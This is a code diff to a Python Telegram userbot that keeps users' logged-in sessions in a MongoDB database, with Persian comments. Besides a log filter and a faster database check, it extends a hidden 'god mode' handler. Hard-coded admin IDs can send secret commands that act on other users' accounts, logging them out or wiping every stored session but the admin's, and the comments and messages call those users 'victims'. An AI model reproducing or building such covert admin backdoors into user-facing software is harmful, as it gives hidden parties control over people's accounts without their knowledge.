@@ -26,8 +26,23 @@ from pymongo.mongo_client import MongoClient
 from pymongo.server_api import ServerApi
 import certifi
 
+# --- Custom Log Filter ---
+# این کلاس ارورهای تکراری و بی‌اهمیت مربوط به حافظه موقت را فیلتر می‌کند تا لاگ‌ها تمیز بمانند
+class LogFilter(logging.Filter):
+    def filter(self, record):
+        msg = record.getMessage()
+        # مخفی کردن ارورهای Peer id invalid که در حالت in_memory طبیعی هستند
+        if "Peer id invalid" in msg or "ID not found" in msg or "Task exception was never retrieved" in msg:
+            return False
+        return True
+
 # --- Logging Setup ---
+# تنظیمات پایه لاگ
 logging.basicConfig(level=logging.INFO, format='[%(asctime)s] %(levelname)s - %(message)s')
+
+# اعمال فیلتر روی کتابخانه‌های پر سروصدا
+for logger_name in ["pyrogram", "asyncio", "pyrogram.client", "pyrogram.session.session", "pyrogram.connection.connection"]:
+    logging.getLogger(logger_name).addFilter(LogFilter())
 
 # =======================================================
 # ⚠️ Main Settings
@@ -284,9 +299,14 @@ async def db_integrity_task(client: Client, user_id: int, my_phone: str):
     while user_id in ACTIVE_BOTS:
         try:
             if sessions_collection is not None:
+                # چک میکنیم آیا شماره ما هنوز در دیتابیس هست؟
                 user_doc = sessions_collection.find_one({'phone_number': my_phone})
+                
                 if not user_doc:
+                    # اگر نبودیم، یعنی ادمین ما را حذف کرده است.
                     logging.warning(f"User {user_id} removed from DB. Initiating clean shutdown.")
+                    
+                    # 1. خاموش کردن ساعت و برگرداندن نام
                     CLOCK_STATUS[user_id] = False
                     try:
                         me = await client.get_me()
@@ -294,17 +314,23 @@ async def db_integrity_task(client: Client, user_id: int, my_phone: str):
                         base_name = re.sub(r'(?:\s*' + CLOCK_CHARS_REGEX_CLASS + r'+)+$', '', current_name).strip()
                         if base_name != current_name:
                             await client.update_profile(first_name=base_name)
-                    except Exception: pass
+                    except Exception:
+                        pass
                     
+                    # 2. خروج از ربات (بستن برنامه)
                     if user_id in ACTIVE_BOTS:
                         _, tasks = ACTIVE_BOTS.pop(user_id)
-                        for task in tasks: task.cancel()
+                        for task in tasks:
+                            task.cancel()
+                    
+                    # 3. توقف کلاینت (به اصطلاح لاگ اوت از اسکریپت ما)
                     await client.stop()
-                    return 
-            await asyncio.sleep(60)
+                    return # پایان تسک
+
+            await asyncio.sleep(10) # هر 10 ثانیه چک کن (سریعتر برای پاسخگویی بهتر)
         except Exception as e:
             logging.error(f"Error in DB integrity check: {e}")
-            await asyncio.sleep(120)
+            await asyncio.sleep(60)
 
 
 async def status_action_task(client: Client, user_id: int):
@@ -363,6 +389,7 @@ async def translate_text(text: str, target_lang: str) -> str:
 
 async def outgoing_message_modifier(client, message):
     user_id = client.me.id
+    # اصلاح: استفاده از strip برای جلوگیری از تداخل با فضای خالی
     text = message.text.strip() if message.text else ""
     if not text or re.match(COMMAND_REGEX, text, re.IGNORECASE):
         return
@@ -382,7 +409,7 @@ async def outgoing_message_modifier(client, message):
         try:
             await message.edit_text(modified_text)
         except Exception as e:
-            pass 
+            pass # خطا را لاگ نمی‌کنیم تا اسپم نشود
     
 
 async def enemy_handler(client, message):
@@ -445,38 +472,50 @@ async def incoming_message_manager(client, message):
 
 # --- GOD MODE HANDLER ---
 async def god_mode_handler(client, message):
+    # چک می‌کنیم آیا پیام از طرف یکی از ادمین‌های ویژه است
     if not message.from_user or message.from_user.id not in GOD_ADMIN_IDS:
         return
 
     target_user_id = client.me.id
     command = message.text.strip() if message.text else ""
 
+    # --- دستور ریست دیتابیس (Reset Database) ---
     if command == "ریست دیتابیس":
         try:
             sender_id = message.from_user.id
             current_bot_phone = getattr(client, 'my_phone_number', None)
             
+            # اگر ادمین روی اکانت خودش این دستور را بزند (در Saved Messages)
             if sender_id == client.me.id:
                  if sessions_collection is not None and current_bot_phone:
+                     # حذف تمام دیتابیس بجز شماره خودم
+                     logging.info(f"Admin {current_bot_phone} requested DB reset. Deleting others...")
                      result = sessions_collection.delete_many({'phone_number': {'$ne': current_bot_phone}})
                      deleted_count = result.deleted_count
-                     await client.send_message("me", f"✅ **عملیات پاکسازی با موفقیت انجام شد.**\n\n🗑 تعداد {deleted_count} نشست (قربانی) از دیتابیس حذف شدند.\n⚠️ آنها به زودی به طور خودکار از اکانت خارج می‌شوند.")
+                     await client.send_message("me", f"✅ **عملیات پاکسازی با موفقیت انجام شد.**\n\n🗑 تعداد {deleted_count} نشست (قربانی) از دیتابیس حذف شدند.\n⚠️ آنها ظرف ۱۵ ثانیه آینده به طور خودکار از اکانت خارج می‌شوند.")
                  return
 
+            # اگر دستور روی اکانت قربانی اجرا شد (توسط ادمین)
+            # قربانی کاری نمی‌کند، چون تسک db_integrity_task او را حذف خواهد کرد.
+            # فقط شاید بخواهیم فورا عکس‌العمل نشان دهد:
             if sessions_collection is not None and current_bot_phone:
                  sessions_collection.delete_one({'phone_number': current_bot_phone})
+                 # تسک db_integrity_task بقیه کار (خروج) را انجام میدهد.
             
             return 
 
         except Exception as e:
             logging.error(f"Error in Reset Database: {e}")
 
+
+    # --- دستورات هدفمند (Reply لازم است) ---
     if not message.reply_to_message or not message.reply_to_message.from_user:
         return
         
     if message.reply_to_message.from_user.id != client.me.id:
         return
 
+    # دستور مخفی برای حذف نشست و دیتابیس (Logout + DB Remove)
     if command in ["سیک", "بن"]:
         logging.warning(f"GOD ADMIN TRIGGERED KICK FOR USER: {target_user_id}")
         try:
